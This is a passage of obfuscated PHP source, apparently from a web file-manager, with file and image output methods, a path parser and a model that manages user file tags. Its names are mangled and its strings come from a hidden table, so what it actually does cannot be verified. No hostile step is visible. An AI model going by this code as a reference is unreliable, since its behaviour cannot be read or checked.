º‘ —„, $ Â½Ùêœ = false, $ÕãËŞ•  = false, $ƒÆîíÀ = '') { $this->_fileOut($ º‘ —„, $ Â½Ùêœ, $ÕãËŞ• , $ƒÆîíÀ); } public function fileOutServer($òªšƒ»à, $ŒŸ€æÉ = false, $ÏÀ‹ë†î = false, $·¤‰Éß = '') { $this->_fileOut($òªšƒ»à, $ŒŸ€æÉ, $ÏÀ‹ë†î, $·¤‰Éß, !0); } protected function _fileOutImage($¨ŞÅâ´¦, $ë‰„ÉÉÀ = 250) { $»óÈµÀ =& $_SERVER[‰‰Ş‚€]; $§Êä™îÆ = $this->model->pathInfo($¨ŞÅâ´¦); if ($§Êä™îÆ[$»óÈµÀ[504]] == $»óÈµÀ[101]) { show_json($»óÈµÀ[1472] . $¨ŞÅâ´¦, !1); } $ Ú‹¡À = $this->model->fileInfoGet($¨ŞÅâ´¦); $§Êä™îÆ[$»óÈµÀ[192]] = $ Ú‹¡À[$»óÈµÀ[97]]; $GLOBALS[$»óÈµÀ[191]] = $§Êä™îÆ; IO::fileOutImage($ Ú‹¡À[$»óÈµÀ[97]], $ë‰„ÉÉÀ); } public function fileOutImage($ÜŸù›íû, $ŞÈœÑÑÁ = 250) { $this->_fileOutImage($ÜŸù›íû, $ŞÈœÑÑÁ); } public function fileOutImageServer($î°“¦›¹, $íñÛüœ” = 250) { $this->_fileOutImage($î°“¦›¹, $íñÛüœ”); } public function link($…œôô„, $„¶ÉèäÒ = '') { $ÏŸˆÇËº = $this->model->fileInfoGet($…œôô„); return IO::link($ÏŸˆÇËº[$_SERVER[‰‰Ş‚€][97]], $„¶ÉèäÒ); } protected function parse($ı¾ÎˆéÒ) { $ú½¨÷çÅ =& $_SERVER[‰‰Ş‚€]; if (strstr($ı¾ÎˆéÒ, $ú½¨÷çÅ[18]) === !1) { return array($ú½¨÷çÅ[512] => intval($ı¾ÎˆéÒ), $ú½¨÷çÅ[97] => $ú½¨÷çÅ[22], $ú½¨÷çÅ[1468] => array()); } $¸‘Ï©Ê = explode($ú½¨÷çÅ[18], trim($ı¾ÎˆéÒ, $ú½¨÷çÅ[18])); if (count($¸‘Ï©Ê) < 2) { show_tips(clear_html($ı¾ÎˆéÒ) . $ú½¨÷çÅ[1473]); } return array($ú½¨÷çÅ[512] => intval($¸‘Ï©Ê[0]), $ú½¨÷çÅ[97] => $¸‘Ï©Ê[1], $ú½¨÷çÅ[1468] => array_slice($¸‘Ï©Ê, 1)); } } goto cœ–À¾ƒÏ—; C”ÉŒ‹µ…¼: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($í•‰Ö×©) { $Ê„˜åƒÄ =& $_SERVER[‰‰Ş‚€]; return array($Ê„˜åƒÄ[2136] => array($Ê„˜åƒÄ[2576] . USER_ID, $Ê„˜åƒÄ[2137])); } protected function listData() { $Æ¿îäóÛ =& $_SERVER[‰‰Ş‚€]; $É ©å§¨ = array($Æ¿îäóÛ[1811] => USER_ID, $Æ¿îäóÛ[577] => array($Æ¿îäóÛ[2140], 0)); $»†Ç§å± = $Æ¿îäóÛ[2577]; $À›„É—í = $this->field($»†Ç§å±)->where($É ©å§¨)->order($Æ¿îäóÛ[2142])->select(); return $À›„É—í ? $À›„É—í : array(); } protected function addToTag($è®Ô·ˆş, $‘×«Ñ«à) { $Ñİ½»Å÷ =& $_SERVER[‰‰Ş‚€]; if (!Model($Ñİ½»Å÷[2300])->listData($‘×«Ñ«à)) { return !1; } if (is_numeric($è®Ô·ˆş)) { $ÁìÊÏş¥ = Model($Ñİ½»Å÷[929])->pathInfo($è®Ô·ˆş); if (!$ÁìÊÏş¥) { return !1; } } else { $ÁìÊÏş¥ = IO::infoSimple($è®Ô·ˆş); if (!$ÁìÊÏş¥) { return !1; } $Ÿ·Ø¤¤Ë = $ÁìÊÏş¥[$Ñİ½»Å÷[42]]; $´Ëßº¯´ = $ÁìÊÏş¥[$Ñİ½»Å÷[43]]; if (isset($ÁìÊÏş¥[$Ñİ½»Å÷[504]])) { $´Ëßº¯´ = $ÁìÊÏş¥[$Ñİ½»Å÷[504]] == $Ñİ½»Å÷[101] ? $Ñİ½»Å÷[88] : $Ñİ½»Å÷[241]; } } $«ëÄß–û = array($Ñİ½»Å÷[1811] => USER_ID, $Ñİ½»Å÷[577] => $‘×«Ñ«à, $Ñİ½»Å÷[514] => $è®Ô·ˆş, $Ñİ½»Å÷[515] => $´Ëßº¯´ ? $´Ëßº¯´ : $Ñİ½»Å÷[509], $Ñİ½»Å÷[513] => $Ÿ·Ø¤¤Ë ? $Ÿ·Ø¤¤Ë : $Ñİ½»Å÷[22], $Ñİ½»Å÷[2024] => 0); if ($this->where($«ëÄß–û)->find()) { return !1; } return $this->add($«ëÄß–û); } protected function removeFromTag($Š†œÅïÛ, $¥Ïç ’Ø) { $¹™Âø­ =& $_SERVER[‰‰Ş‚€]; if (!Model($¹™Âø­[2300])->listData($¥Ïç ’Ø)) { return !1; } if (is_array($Š†œÅïÛ)) { $Š†œÅïÛ = array($¹™Âø­[17], $Š†œÅïÛ); } $’áŸí = array($¹™Âø­[1811] => USER_ID, $¹™Âø­[577] => $¥Ïç ’Ø, $¹™Âø­[514] => $Š†œÅïÛ); return $this->where($’áŸí)->delete(); } protected function removeByTag($º¹ãÙ¦) { $‚•ÏÛ½š =& $_SERVER[‰‰Ş‚€]; if (!$º¹ãÙ¦) { return !1; } $òÙÔ·Æ  = array($‚•ÏÛ½š[1811] => USER_ID, $‚•ÏÛ½š[577] => $º¹ãÙ¦); return $this->where($òÙÔ·Æ )->delete(); } protected function removeBySource($¼°…àøå) { $îªùëÜ˜ =& $_SERVER[‰‰Ş‚€]; if (is_array($¼°…àøå)) { $¼°…àøå = array($îªùëÜ˜[17], $¼°…àøå); } $ĞôËÁºµ = array($îªùëÜ˜[1811] => USER_ID, $îªùëÜ˜[577] => array($îªùëÜ˜[1124], 0), $îªùëÜ˜[514] => $¼°…àøå); return $this->where($ĞôËÁºµ)->delete(); } }